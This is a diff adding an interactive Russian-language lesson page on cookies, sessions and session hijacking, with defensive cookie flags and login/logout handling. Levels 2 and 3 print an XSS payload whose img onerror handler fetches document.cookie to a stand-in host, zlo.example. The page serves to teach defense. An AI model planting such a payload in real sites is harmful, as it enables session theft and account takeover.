@@ -1,0 +1,722 @@
+<section class="ix ix-cookie-sessii" data-ix="cookie-sessii" aria-label="Выпуск 24: Печенюшник, cookie и сессии">
+
+<div class="ck-hud" aria-hidden="true">
+  <span class="ck-hud-l">ЗАЩИТА СЕССИИ</span>
+  <span class="ck-bar"><i></i><b>0%</b></span>
+  <span class="ck-pips"><span>1</span><span>2</span><span>3</span><span>4</span></span>
+</div>
+<div class="ck-sr" aria-live="polite" data-live></div>
+
+<!-- ========== MISSION ========== -->
+<div class="ck-mission" id="ix-cookie-sessii-mission">
+  <div class="ck-poster" aria-hidden="true">
+    <span class="ck-pdots"></span>
+    <span class="ck-ptag">ЦЕЛЬ: ПЕЧЕНЮШНИК</span>
+    <span class="ck-pcookie"><i></i><i></i><i></i><i></i><i></i><b>sid</b></span>
+    <span class="ck-pname">ПЕЧЕ<br>НЮШ<br>НИК</span>
+    <span class="ck-tape"><span>Cookie: sid=7f3a9c2e41b8d605 &nbsp;▸&nbsp; Cookie: sid=7f3a9c2e41b8d605 &nbsp;▸&nbsp; Cookie: sid=7f3a9c2e41b8d605 &nbsp;▸&nbsp; </span></span>
+  </div>
+  <div class="ck-mbody">
+    <p class="ck-kick">ВХОДЯЩЕЕ ЗАДАНИЕ</p>
+    <h2 class="ck-mt" id="ix-cookie-sessii-mt">Вход<br>без пароля</h2>
+    <p class="ck-msub">Печенюшник не подбирает пароли. Он&nbsp;ворует <em>печенье-пропуск</em>, которое сайт выдаёт после входа. Разбери, как оно устроено, и&nbsp;сделай так, чтобы украденное рассыпалось.</p>
+    <p class="ck-motto">«Пароль мне не&nbsp;нужен. Мне нужно твоё печенье».</p>
+    <ol class="ck-moves" aria-label="Четыре уровня миссии">
+      <li data-mv="1"><b>01</b><span>Пропуск</span></li>
+      <li data-mv="2"><b>02</b><span>Кража</span></li>
+      <li data-mv="3"><b>03</b><span>Три флага</span></li>
+      <li data-mv="4"><b>04</b><span>Вход и выход</span></li>
+    </ol>
+    <button class="ck-go" type="button" data-act="start">Принять миссию ▶</button>
+  </div>
+</div>
+
+<!-- ========== L1: COOKIE + SESSION ========== -->
+<section class="ck-lvl ck-locked" id="ix-cookie-sessii-l1" aria-labelledby="ix-cookie-sessii-t1">
+  <div class="ck-lh"><span class="ck-ln">УРОВЕНЬ 1 / 4</span><h3 class="ck-lt" id="ix-cookie-sessii-t1">Сервер без памяти</h3><span class="ck-ok">ПРОЙДЕНО</span></div>
+  <div class="ck-lockcap"><span>🔒 Сначала прими миссию</span></div>
+  <div class="ck-lb">
+    <div class="ck-say"><span class="ck-who ck-son">СОНЯ</span><span class="ck-bub">Я один раз ввела пароль в дневнике. Почему он не спрашивает его на каждой странице?</span></div>
+    <div class="ck-say"><span class="ck-who">ДЯДЯ МИША</span><span class="ck-bub">HTTP ничего не помнит. Для сервера каждый запрос — как от незнакомца. Поэтому после входа он выдаёт <b>пропуск</b>. Нажми «Войти» и смотри на оба окна.</span></div>
+
+    <div class="ck-flow" data-flow>
+      <div class="ck-node ck-browser">
+        <p class="ck-nlab">БРАУЗЕР СОНИ</p>
+        <div class="ck-jar" data-jar><span class="ck-jar-empty" data-jar-empty>печенья нет</span></div>
+      </div>
+      <div class="ck-wire" aria-hidden="true"><span class="ck-pkt" data-pkt></span></div>
+      <div class="ck-node ck-server">
+        <p class="ck-nlab">СЕРВЕР ДНЕВНИКА</p>
+        <div class="ck-db" data-db><span class="ck-db-empty" data-db-empty>сессий нет</span></div>
+      </div>
+    </div>
+    <p class="ck-net" data-net1>Пока ты не вошла, сервер не знает, кто ты.</p>
+
+    <div class="ck-act"><button class="ck-btn ck-y" type="button" data-act="login1">Войти по паролю ▶</button></div>
+
+    <div class="ck-after">
+      <div class="ck-split">
+        <div class="ck-card">
+          <p class="ck-ctt">COOKIE</p>
+          <p class="ck-cbody">Маленькая записка <code>sid=7f3a…</code> у тебя в браузере. Браузер сам прикладывает её к&nbsp;каждому запросу на этот сайт. Внутри — <b>только номер</b>, не пароль и не данные.</p>
+        </div>
+        <div class="ck-card">
+          <p class="ck-ctt">СЕССИЯ</p>
+          <p class="ck-cbody">Запись на&nbsp;<b>сервере</b>: номер <code>7f3a…</code> → «это Соня, вошла в&nbsp;17:04, до&nbsp;18:04». Все данные лежат тут. Cookie — лишь ключ от этой строки.</p>
+        </div>
+      </div>
+      <p class="ck-def"><b>Вот зачем cookie.</b> Сервер без памяти, а пароль каждый раз слать опасно. Поэтому один раз проверяем пароль, заводим сессию и дальше узнаём тебя по её номеру в cookie.</p>
+      <div class="ck-act"><button class="ck-btn" type="button" data-goto="ix-cookie-sessii-l2">А если номер украдут? ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L2: THEFT ========== -->
+<section class="ck-lvl ck-locked" id="ix-cookie-sessii-l2" aria-labelledby="ix-cookie-sessii-t2">
+  <div class="ck-lh"><span class="ck-ln">УРОВЕНЬ 2 / 4</span><h3 class="ck-lt" id="ix-cookie-sessii-t2">Кража печенья</h3><span class="ck-ok">ЗАКРЫТО</span></div>
+  <div class="ck-lockcap"><span>🔒 Сначала получи пропуск</span></div>
+  <div class="ck-lb">
+    <div class="ck-say"><span class="ck-who ck-v">ПЕЧЕНЮШНИК</span><span class="ck-bub">Зачем мне пароль Сони? Я возьму её печенье. Этот дневник разрешает комментарии с&nbsp;картинками и&nbsp;не чистит их. Смотри.</span></div>
+
+    <pre class="ck-code" data-code aria-label="Комментарий с чужим скриптом">Соня оставила в дневнике комментарий. Печенюшник
+оставил свой — и дневник показал его как есть:
+
+<span class="ck-badl">&lt;img src=x onerror="fetch('zlo.example/c?'+<b>document.cookie</b>)"&gt;</span></pre>
+    <p class="ck-note">Это <b>XSS</b> — чужой скрипт выполнился на странице дневника. Загляни в выпуск №4, там про него подробно. Сейчас важно одно: скрипт попросил <code>document.cookie</code>.</p>
+
+    <p class="ck-q">У cookie <b>нет</b> защитных флагов. Что отправится на <code>zlo.example</code>?</p>
+    <div class="ck-choices" data-steal>
+      <button class="ck-ch" type="button" data-v="no"><b>Ничего</b><span>Браузер не отдаст cookie чужому скрипту</span></button>
+      <button class="ck-ch" type="button" data-v="pass"><b>Пароль Сони</b><span>Он ведь тоже где-то хранится</span></button>
+      <button class="ck-ch" type="button" data-v="sid"><b>Номер сессии sid</b><span>Тот самый пропуск из cookie</span></button>
+    </div>
+    <p class="ck-fb" data-fb2 aria-live="polite"></p>
+
+    <div class="ck-after">
+      <div class="ck-say"><span class="ck-who">ДЯДЯ МИША</span><span class="ck-bub">Теперь у&nbsp;Печенюшника есть номер. Он кладёт его в&nbsp;свой браузер и&nbsp;открывает дневник. Что увидит сервер?</span></div>
+      <div class="ck-flow ck-flow-theft" data-theft>
+        <div class="ck-node ck-browser ck-evil">
+          <p class="ck-nlab">БРАУЗЕР ПЕЧЕНЮШНИКА</p>
+          <div class="ck-jar ck-jar-stolen"><span class="ck-cookie"><i></i><i></i><i></i><i></i><i></i><b>sid=7f3a…</b></span></div>
+        </div>
+        <div class="ck-wire" aria-hidden="true"><span class="ck-pkt" data-pkt2></span></div>
+        <div class="ck-node ck-server"><p class="ck-nlab">СЕРВЕР</p><div class="ck-db"><span class="ck-db-row" data-theft-row>7f3a… → Соня</span></div></div>
+      </div>
+      <p class="ck-big" data-theft-txt>Сервер видит номер Сони.<br><span>И пускает Печенюшника как Соню — без пароля.</span></p>
+      <p class="ck-def">Это <b>угон сессии</b> (session hijacking). Пароль остался секретом, но пропуск по нему уже и не нужен.</p>
+      <div class="ck-act"><button class="ck-btn ck-y" type="button" data-goto="ix-cookie-sessii-l3">Поставить флаги ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L3: THREE FLAGS ========== -->
+<section class="ck-lvl ck-locked" id="ix-cookie-sessii-l3" aria-labelledby="ix-cookie-sessii-t3">
+  <div class="ck-lh"><span class="ck-ln">УРОВЕНЬ 3 / 4</span><h3 class="ck-lt" id="ix-cookie-sessii-t3">Три флага</h3><span class="ck-ok">ПОСТАВЛЕНЫ</span></div>
+  <div class="ck-lockcap"><span>🔒 Сначала разбери кражу</span></div>
+  <div class="ck-lb">
+    <div class="ck-say"><span class="ck-who">ДЯДЯ МИША</span><span class="ck-bub">Сервер выдаёт cookie строкой <code>Set-Cookie</code>. К&nbsp;ней можно дописать флаги. Включи все три и&nbsp;посмотри, что каждый закрывает.</span></div>
+
+    <div class="ck-setcookie" data-setcookie>
+      <code>Set-Cookie: sid=7f3a9c2e41b8d605<span data-flagslot></span></code>
+    </div>
+
+    <div class="ck-flags" data-flags>
+      <button class="ck-flag" type="button" data-flag="HttpOnly" aria-pressed="false">
+        <span class="ck-fname">HttpOnly</span>
+        <span class="ck-fdesc">Скрипт не прочитает cookie через <code>document.cookie</code></span>
+        <span class="ck-fstop" data-fstop>Останавливает: кражу через XSS</span>
+      </button>
+      <button class="ck-flag" type="button" data-flag="Secure" aria-pressed="false">
+        <span class="ck-fname">Secure</span>
+        <span class="ck-fdesc">Cookie уходит только по HTTPS, не по открытому HTTP</span>
+        <span class="ck-fstop" data-fstop>Останавливает: перехват в чужом Wi-Fi</span>
+      </button>
+      <button class="ck-flag" type="button" data-flag="SameSite=Lax" aria-pressed="false">
+        <span class="ck-fname">SameSite=Lax</span>
+        <span class="ck-fdesc">Не прикладывается к запросам с чужого сайта</span>
+        <span class="ck-fstop" data-fstop>Останавливает: CSRF с другого домена</span>
+      </button>
+    </div>
+    <p class="ck-fb" data-fb3 aria-live="polite"></p>
+
+    <div class="ck-after">
+      <p class="ck-def"><b>Повтори кражу из уровня 2.</b> Теперь у&nbsp;cookie стоит <code>HttpOnly</code>. Скрипт Печенюшника снова просит <code>document.cookie</code>.</p>
+      <pre class="ck-code ck-code-ok" data-code2 aria-label="Скрипт у пустого ответа">fetch('zlo.example/c?'+document.cookie)
+<span class="ck-goodl">→ отправлено: <b>c?</b> (пусто — браузер скрыл sid)</span></pre>
+      <p class="ck-note" data-xssnote>Печенье не досталось. Но саму XSS надо чинить отдельно: пока Соня на странице, скрипт всё ещё может слать запросы от её имени. Флаг прячет cookie, а не лечит дыру.</p>
+      <div class="ck-act"><button class="ck-btn ck-y" type="button" data-goto="ix-cookie-sessii-l4">Вход и выход ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== L4: LOGIN / LOGOUT ========== -->
+<section class="ck-lvl ck-locked" id="ix-cookie-sessii-l4" aria-labelledby="ix-cookie-sessii-t4">
+  <div class="ck-lh"><span class="ck-ln">УРОВЕНЬ 4 / 4</span><h3 class="ck-lt" id="ix-cookie-sessii-t4">Вход и выход</h3><span class="ck-ok">ПОНЯТО</span></div>
+  <div class="ck-lockcap"><span>🔒 Сначала поставь флаги</span></div>
+  <div class="ck-lb">
+    <div class="ck-say"><span class="ck-who ck-son">СОНЯ</span><span class="ck-bub">Флаги поставили. А&nbsp;с&nbsp;самим входом и&nbsp;выходом что не так?</span></div>
+    <div class="ck-say"><span class="ck-who">ДЯДЯ МИША</span><span class="ck-bub">Две ловушки. Реши обе.</span></div>
+
+    <p class="ck-q">Соня вошла в&nbsp;дневник. Какой номер сессии должен быть у&nbsp;неё после входа?</p>
+    <div class="ck-choices ck-two-ch" data-fix1>
+      <button class="ck-ch" type="button" data-v="same"><b>Тот же, что до входа</b><span>До входа у неё уже был sid гостя</span></button>
+      <button class="ck-ch" type="button" data-v="new"><b>Новый номер</b><span>Старый больше не действует</span></button>
+    </div>
+    <p class="ck-fb" data-fb4a aria-live="polite"></p>
+
+    <div class="ck-after2" data-after4a>
+      <p class="ck-q">Соня нажала «Выйти». Сервер удалил cookie в&nbsp;её браузере. У&nbsp;Печенюшника осталась копия номера. Что ещё обязан сделать сервер?</p>
+      <div class="ck-choices ck-two-ch" data-fix2>
+        <button class="ck-ch" type="button" data-v="browser"><b>Ничего, cookie удалили</b><span>В браузере Сони её больше нет</span></button>
+        <button class="ck-ch" type="button" data-v="server"><b>Стереть сессию на сервере</b><span>Номер 7f3a… больше ничей</span></button>
+      </div>
+      <p class="ck-fb" data-fb4b aria-live="polite"></p>
+
+      <div class="ck-after">
+        <p class="ck-big">Выход — это смерть сессии <span>на сервере</span>, а не только в браузере.</p>
+        <p class="ck-def">Удалить cookie у&nbsp;себя — всё равно что выбросить свой пропуск. Копия у&nbsp;вора живёт, пока сервер помнит номер. Поэтому «Выйти» стирает сессию, а&nbsp;ещё у&nbsp;неё есть тайм-аут по бездействию.</p>
+        <div class="ck-act"><button class="ck-btn ck-y" type="button" data-goto="ix-cookie-sessii-battle">К битве с Печенюшником ▼</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== BATTLE ========== -->
+<section class="ck-battle" id="ix-cookie-sessii-battle" aria-labelledby="ix-cookie-sessii-bt" tabindex="-1">
+  <div class="ck-bh">
+    <span class="ck-bface" aria-hidden="true"><b>sid</b></span>
+    <div class="ck-bhx">
+      <h2 class="ck-bt" id="ix-cookie-sessii-bt">Битва с Печенюшником</h2>
+      <div class="ck-hp" role="img" aria-label="Здоровье Печенюшника" data-hp-wrap><i data-hp></i><b data-hp-t>ПЕЧЕНЮШНИК · HP 3/3</b></div>
+    </div>
+  </div>
+  <div class="ck-bbody" data-battle aria-live="polite"></div>
+</section>
+
+<!-- ========== INTERVIEW ========== -->
+<section class="ck-iv" aria-labelledby="ix-cookie-sessii-ivt">
+  <p class="ck-ivk">ВОПРОС С СОБЕСЕДОВАНИЯ · JUNIOR APPSEC</p>
+  <h2 class="ck-ivq" id="ix-cookie-sessii-ivt">Как защитить сессию пользователя? Какие флаги cookie ты поставишь и зачем?</h2>
+  <div class="ck-think">
+    <b>Подумай сам</b>
+    <span>Подсказка: где лежат данные сессии, а где только номер? Назови три флага и скажи, какую атаку закрывает каждый. Что делает вход, а что — выход?</span>
+  </div>
+  <button class="ck-btn ck-y" type="button" data-act="iv" aria-expanded="false" aria-controls="ix-cookie-sessii-iva">Показать сильный ответ</button>
+  <div class="ck-iva" id="ix-cookie-sessii-iva" hidden>
+    <ol>
+      <li><b>Номер, а не данные.</b> ID сессии длинный и случайный, данные лежат на сервере. Браузер хранит только номер в cookie.</li>
+      <li><b>Три флага.</b> <code>HttpOnly</code> — скрипт не прочитает cookie (защита от кражи через XSS); <code>Secure</code> — только по HTTPS; <code>SameSite=Lax</code> или <code>Strict</code> — cookie не уходит с чужих сайтов (защита от CSRF). Плюс префикс <code>__Host-</code> и HTTPS на всём сайте с HSTS.</li>
+      <li><b>Вход и выход.</b> При входе выдаём новый номер (защита от фиксации сессии), при выходе стираем сессию на сервере, а не только cookie. Есть тайм-аут бездействия и абсолютный срок.</li>
+      <li><b>Корни чиним отдельно.</b> От XSS — экранирование вывода и CSP, от CSRF — токен на изменяющих запросах. Флаги cookie их дополняют, а не заменяют.</li>
+    </ol>
+    <p class="ck-ivx"><b>Ошибка новичка:</b> «HttpOnly защищает от XSS». Нет — он лишь прячет cookie. Пока дыра открыта, скрипт злодея действует от имени пользователя и без кражи номера.</p>
+  </div>
+</section>
+
+<!-- ========== CHEAT SHEET ========== -->
+<section class="ck-cs" aria-labelledby="ix-cookie-sessii-cst">
+  <h2 class="ck-cst" id="ix-cookie-sessii-cst">Шпаргалка: что важно знать</h2>
+  <ol class="ck-csl">
+    <li><span class="ck-csn" aria-hidden="true">01</span><div><b>Зачем cookie</b><p>HTTP не помнит прошлый запрос. Cookie возвращает серверу номер, по которому он узнаёт вошедшего.</p></div></li>
+    <li><span class="ck-csn" aria-hidden="true">02</span><div><b>Cookie ≠ сессия</b><p>Cookie — номер в браузере. Сессия — запись на сервере: кто вошёл и до какого времени.</p></div></li>
+    <li><span class="ck-csn" aria-hidden="true">03</span><div><b>HttpOnly</b><p>Скрипт не прочитает cookie через document.cookie. Главная защита номера от кражи через XSS.</p></div></li>
+    <li><span class="ck-csn" aria-hidden="true">04</span><div><b>Secure</b><p>Cookie уходит только по HTTPS, поэтому её не подсмотреть в открытом Wi-Fi.</p></div></li>
+    <li><span class="ck-csn" aria-hidden="true">05</span><div><b>SameSite</b><p>Lax или Strict не дают приложить cookie к запросу с чужого сайта. Вместе с токеном — защита от CSRF.</p></div></li>
+    <li><span class="ck-csn" aria-hidden="true">06</span><div><b>Новый ID при входе</b><p>После входа выдаём новый номер, иначе злодей подсунет жертве заранее известный (фиксация сессии).</p></div></li>
+    <li><span class="ck-csn" aria-hidden="true">07</span><div><b>Выход убивает сессию</b><p>«Выйти» стирает сессию на сервере, а не только cookie в браузере. Иначе краденая копия ещё работает.</p></div></li>
+  </ol>
+  <p class="ck-train"><b>Тренируйся легально:</b> PortSwigger Web Security Academy (разделы Authentication и CSRF), OWASP Juice Shop, picoCTF. Чужие cookie и чужие аккаунты трогать нельзя.</p>
+</section>
+
+</section>
+
+<style>
+.ix-cookie-sessii{--ink:#141414;--paper:#fff7e3;--yel:#ffd60a;--org:#ff9f1c;--red:#ff3b3b;--vred:#f00d15;--green:#2ee59d;--gdk:#0a7a4e;--muted:#5b5446;
+  --f-mono:'Rubik Mono One',sans-serif;--f-cap:'Russo One',sans-serif;--f-hand:Neucha,cursive;--f-text:Rubik,system-ui,sans-serif;--code:ui-monospace,'SFMono-Regular',Menlo,Consolas,monospace;
+  position:relative;display:block;color:var(--ink);font-family:var(--f-text);font-size:18px;line-height:1.5;max-width:900px;margin:0 auto}
+.ix-cookie-sessii *,.ix-cookie-sessii *::before,.ix-cookie-sessii *::after{box-sizing:border-box}
+.ix-cookie-sessii button{font:inherit;color:inherit}
+.ix-cookie-sessii :focus-visible{outline:4px solid var(--red);outline-offset:3px}
+.ix-cookie-sessii [hidden]{display:none !important}
+.ix-cookie-sessii p{margin:0}
+.ix-cookie-sessii code{font-family:var(--code);font-weight:700;font-size:.92em;background:rgba(20,20,20,.08);padding:1px 5px;border-radius:4px;overflow-wrap:anywhere}
+.ix-cookie-sessii .ck-sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap}
+
+/* HUD */
+.ix-cookie-sessii .ck-hud{position:sticky;top:0;z-index:30;display:none;align-items:center;gap:10px;padding:8px 12px;background:var(--ink);color:#fff;border:3px solid var(--ink)}
+.ix-cookie-sessii .ck-hud.ck-on{display:flex;animation:ck-drop .4s cubic-bezier(.2,1.4,.4,1)}
+.ix-cookie-sessii .ck-hud-l{font-family:var(--f-cap);font-size:12px;color:var(--yel);white-space:nowrap}
+.ix-cookie-sessii .ck-bar{flex:1;min-width:60px;height:20px;border:2px solid #fff;background:#2a2a2a;position:relative;overflow:hidden}
+.ix-cookie-sessii .ck-bar i{position:absolute;inset:0 auto 0 0;width:0;background:var(--green);transition:width .6s cubic-bezier(.3,1.5,.5,1);background-image:repeating-linear-gradient(-45deg,rgba(0,0,0,.18) 0 6px,transparent 6px 12px)}
+.ix-cookie-sessii .ck-bar b{position:absolute;inset:0;display:grid;place-items:center;font-family:var(--f-cap);font-weight:400;font-size:12px;text-shadow:0 0 3px #000}
+.ix-cookie-sessii .ck-hud.ck-hit{animation:ck-shake .4s}
+.ix-cookie-sessii .ck-hud.ck-hit .ck-bar{border-color:var(--red)}
+.ix-cookie-sessii .ck-pips{display:flex;gap:4px}
+.ix-cookie-sessii .ck-pips span{width:24px;height:24px;border:2px solid #fff;display:grid;place-items:center;font-family:var(--f-cap);font-size:12px}
+.ix-cookie-sessii .ck-pips span.ck-done{background:var(--yel);border-color:var(--yel);color:var(--ink)}
+
+/* MISSION + POSTER */
+.ix-cookie-sessii .ck-mission{position:relative;margin:24px 0 0;background:var(--ink);color:#fff;border:3px solid var(--ink);box-shadow:8px 8px 0 var(--org);display:grid;grid-template-columns:1fr 1fr;overflow:hidden}
+.ix-cookie-sessii .ck-poster{position:relative;min-height:440px;overflow:hidden;background:#0b0b0b;border-right:3px solid var(--org);display:flex;flex-direction:column;justify-content:center;padding:28px 22px 96px;isolation:isolate}
+.ix-cookie-sessii .ck-pdots{position:absolute;inset:0;z-index:-1;background-image:radial-gradient(rgba(255,159,28,.5) 1.4px,transparent 2.2px);background-size:9px 9px;-webkit-mask-image:radial-gradient(circle at 72% 32%,#000 0,transparent 70%);mask-image:radial-gradient(circle at 72% 32%,#000 0,transparent 70%)}
+.ix-cookie-sessii .ck-pname{display:block;font-family:var(--f-mono);font-size:clamp(40px,7vw,58px);line-height:.95;color:var(--yel);letter-spacing:-.02em;text-shadow:5px 5px 0 #000,6px 6px 0 rgba(240,13,21,.9)}
+.ix-cookie-sessii .ck-pcookie{align-self:flex-end;position:relative;width:118px;height:118px;border-radius:50%;background:radial-gradient(circle at 38% 34%,#e8a24e,#b96c1e 70%,#8a4e13);border:3px solid #0b0b0b;box-shadow:0 0 0 3px var(--org),6px 6px 0 rgba(0,0,0,.6);margin-bottom:18px;display:grid;place-items:center}
+.ix-cookie-sessii .ck-pcookie i{position:absolute;width:13px;height:13px;border-radius:50%;background:#4a2a0e;box-shadow:inset 1px 1px 0 rgba(0,0,0,.5)}
+.ix-cookie-sessii .ck-pcookie i:nth-child(1){top:20%;left:28%}
+.ix-cookie-sessii .ck-pcookie i:nth-child(2){top:30%;left:62%}
+.ix-cookie-sessii .ck-pcookie i:nth-child(3){top:55%;left:24%}
+.ix-cookie-sessii .ck-pcookie i:nth-child(4){top:64%;left:60%}
+.ix-cookie-sessii .ck-pcookie i:nth-child(5){top:44%;left:46%}
+.ix-cookie-sessii .ck-pcookie b{font-family:var(--code);font-weight:800;font-size:22px;color:#fff;background:rgba(20,20,20,.72);padding:2px 8px;border-radius:5px}
+.ix-cookie-sessii .ck-tape{position:absolute;left:-20%;right:-20%;bottom:44px;transform:rotate(-6deg);background:var(--org);color:var(--ink);border-top:4px solid var(--ink);border-bottom:4px solid var(--ink);box-shadow:0 0 0 3px var(--org);overflow:hidden;white-space:nowrap;font-family:var(--code);font-weight:800;font-size:15px;line-height:1;padding:9px 0}
+.ix-cookie-sessii .ck-tape span{display:inline-block}
+.ix-cookie-sessii.ck-anim .ck-tape span{animation:ck-march 16s linear infinite}
+.ix-cookie-sessii .ck-ptag{position:absolute;left:14px;top:14px;z-index:2;font-family:var(--f-cap);font-size:13px;background:var(--ink);color:var(--org);padding:5px 10px;border:2px solid var(--org)}
+.ix-cookie-sessii .ck-mbody{padding:28px 26px;display:flex;flex-direction:column;gap:18px;justify-content:center}
+.ix-cookie-sessii .ck-kick{font-family:var(--f-cap);font-size:14px;letter-spacing:.12em;color:var(--org)}
+.ix-cookie-sessii .ck-mt{margin:0;font-family:var(--f-mono);font-weight:400;font-size:46px;line-height:1;color:var(--yel);text-transform:uppercase}
+.ix-cookie-sessii .ck-msub{font-size:20px;line-height:1.4}
+.ix-cookie-sessii .ck-msub em{font-style:normal;color:var(--ink);background:var(--yel);padding:0 5px}
+.ix-cookie-sessii .ck-motto{font-family:var(--f-hand);font-size:22px;line-height:1.2;color:#ffd0a0}
+.ix-cookie-sessii .ck-moves{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(4,1fr);gap:7px}
+.ix-cookie-sessii .ck-moves li{border:2px solid #fff;padding:8px 7px 9px}
+.ix-cookie-sessii .ck-moves b{display:block;font-family:var(--f-mono);font-weight:400;font-size:20px;color:var(--ink);-webkit-text-stroke:1.5px var(--yel)}
+.ix-cookie-sessii .ck-moves span{display:block;font-family:var(--f-cap);font-size:12.5px;line-height:1.15;margin-top:4px}
+.ix-cookie-sessii .ck-moves li.ck-x{border-color:var(--green);background:rgba(46,229,157,.15)}
+.ix-cookie-sessii .ck-go{align-self:flex-start;min-height:56px;padding:0 26px;font-family:var(--f-cap);font-size:20px;background:var(--yel);color:var(--ink);border:3px solid var(--ink);box-shadow:5px 5px 0 var(--org);cursor:pointer;transition:transform .12s,box-shadow .12s}
+.ix-cookie-sessii .ck-go:hover{transform:translate(-2px,-2px);box-shadow:7px 7px 0 var(--org)}
+.ix-cookie-sessii .ck-go:active{transform:translate(3px,3px);box-shadow:2px 2px 0 var(--org)}
+.ix-cookie-sessii.ck-anim .ck-go:not(:disabled){animation:ck-pulse 1.8s ease-in-out infinite}
+
+/* LEVELS */
+.ix-cookie-sessii .ck-lvl{position:relative;margin-top:48px;border:3px solid var(--ink);background:#fffdf6;box-shadow:6px 6px 0 var(--ink);scroll-margin-top:56px}
+.ix-cookie-sessii .ck-lh{display:flex;flex-wrap:wrap;align-items:center;gap:8px 12px;padding:14px 18px;border-bottom:3px solid var(--ink);background:var(--yel)}
+.ix-cookie-sessii .ck-ln{font-family:var(--f-cap);font-size:13px;background:var(--ink);color:var(--yel);padding:4px 10px}
+.ix-cookie-sessii .ck-lt{margin:0;font-family:var(--f-mono);font-weight:400;font-size:24px;line-height:1.15}
+.ix-cookie-sessii .ck-ok{display:none;margin-left:auto;font-family:var(--f-cap);font-size:13px;background:var(--green);border:2px solid var(--ink);padding:3px 10px;transform:rotate(2deg)}
+.ix-cookie-sessii .ck-clear .ck-ok{display:inline-block}
+.ix-cookie-sessii .ck-lb{padding:22px 20px 24px}
+.ix-cookie-sessii .ck-locked{pointer-events:none;user-select:none}
+.ix-cookie-sessii .ck-locked .ck-lb{filter:grayscale(1) blur(3px);opacity:.35;max-height:260px;overflow:hidden}
+.ix-cookie-sessii .ck-lockcap{display:none}
+.ix-cookie-sessii .ck-locked .ck-lockcap{display:grid;position:absolute;inset:56px 0 0;place-items:center;z-index:5}
+.ix-cookie-sessii .ck-lockcap span{font-family:var(--f-cap);font-size:16px;background:var(--ink);color:#fff;padding:10px 16px;text-align:center}
+.ix-cookie-sessii .ck-after{display:none;margin-top:28px}
+.ix-cookie-sessii .ck-lvl.ck-clear .ck-after{display:block;animation:ck-up .4s ease-out}
+.ix-cookie-sessii .ck-after2{display:none;margin-top:26px}
+.ix-cookie-sessii .ck-after2.ck-show{display:block;animation:ck-up .4s ease-out}
+
+.ix-cookie-sessii .ck-say{display:flex;gap:10px;align-items:flex-start;margin:0 0 16px}
+.ix-cookie-sessii .ck-who{flex:0 0 auto;font-family:var(--f-cap);font-size:12px;background:var(--ink);color:#fff;padding:3px 8px;margin-top:8px}
+.ix-cookie-sessii .ck-who.ck-son{background:#fff;color:var(--ink);border:2px solid var(--ink)}
+.ix-cookie-sessii .ck-who.ck-v{background:var(--red);color:#fff}
+.ix-cookie-sessii .ck-bub{font-family:var(--f-hand);font-size:23px;line-height:1.2;background:#fff;border:3px solid var(--ink);border-radius:16px;padding:7px 14px;box-shadow:3px 3px 0 var(--ink)}
+.ix-cookie-sessii .ck-bub b{font-family:var(--f-text);font-weight:700;font-size:19px}
+.ix-cookie-sessii .ck-bub code{font-size:.8em}
+
+/* FLOW: browser ↔ server */
+.ix-cookie-sessii .ck-flow{display:grid;grid-template-columns:1fr 64px 1fr;align-items:stretch;gap:0;margin:22px 0 0}
+.ix-cookie-sessii .ck-node{border:3px solid var(--ink);background:#fff;box-shadow:4px 4px 0 var(--ink);padding:12px 14px 16px;min-height:150px;display:flex;flex-direction:column}
+.ix-cookie-sessii .ck-nlab{font-family:var(--f-cap);font-size:12.5px;line-height:1.2;color:var(--ink);background:var(--yel);display:inline-block;align-self:flex-start;padding:3px 8px;margin-bottom:12px;border:2px solid var(--ink)}
+.ix-cookie-sessii .ck-server .ck-nlab{background:var(--ink);color:var(--yel)}
+.ix-cookie-sessii .ck-evil .ck-nlab{background:var(--red);color:#fff;border-color:var(--ink)}
+.ix-cookie-sessii .ck-jar,.ix-cookie-sessii .ck-db{flex:1;display:flex;flex-wrap:wrap;gap:8px;align-content:center;justify-content:center;border:2px dashed #c7bfa8;border-radius:10px;padding:12px;min-height:84px}
+.ix-cookie-sessii .ck-db{border-style:solid;border-color:#3a3a3a;background:#1b1b1b}
+.ix-cookie-sessii .ck-jar-empty,.ix-cookie-sessii .ck-db-empty{font-family:var(--f-hand);font-size:20px;color:#6b6456}
+.ix-cookie-sessii .ck-db-empty{color:#a9a090}
+.ix-cookie-sessii .ck-db-row{font-family:var(--code);font-weight:700;font-size:15px;color:var(--green);background:#0f0f0f;border:1px solid #2ee59d55;padding:4px 8px;border-radius:5px}
+.ix-cookie-sessii .ck-cookie{display:inline-flex;align-items:center;gap:6px;position:relative;font-family:var(--code);font-weight:800;font-size:15px;color:#fff;background:radial-gradient(circle at 36% 32%,#e8a24e,#b96c1e 72%,#8a4e13);border:2px solid #5a3310;border-radius:50px;padding:7px 12px 7px 10px}
+.ix-cookie-sessii .ck-cookie i{width:7px;height:7px;border-radius:50%;background:#3a2109;flex:0 0 auto}
+.ix-cookie-sessii .ck-cookie b{background:rgba(20,20,20,.72);padding:1px 6px;border-radius:4px}
+.ix-cookie-sessii .ck-jar .ck-cookie.ck-pop{animation:ck-pop .5s cubic-bezier(.2,1.6,.4,1)}
+.ix-cookie-sessii .ck-wire{position:relative;align-self:center;height:6px;background:repeating-linear-gradient(90deg,var(--ink) 0 8px,transparent 8px 14px)}
+.ix-cookie-sessii .ck-pkt{position:absolute;top:50%;left:0;width:18px;height:18px;border-radius:50%;background:var(--org);border:2px solid var(--ink);transform:translate(-50%,-50%);opacity:0}
+.ix-cookie-sessii.ck-anim .ck-pkt.ck-fly{animation:ck-fly .7s ease-in-out}
+.ix-cookie-sessii.ck-anim .ck-pkt.ck-flyback{animation:ck-flyback .7s ease-in-out}
+.ix-cookie-sessii .ck-net{margin-top:14px;font-family:var(--code);font-size:15px;color:var(--muted);line-height:1.45}
+
+.ix-cookie-sessii .ck-act{margin-top:20px;display:flex;flex-wrap:wrap;gap:12px}
+.ix-cookie-sessii .ck-btn{min-height:52px;padding:0 22px;font-family:var(--f-cap);font-size:18px;background:var(--ink);color:#fff;border:3px solid var(--ink);box-shadow:4px 4px 0 var(--org);cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:8px;transition:transform .1s,box-shadow .1s;text-align:center}
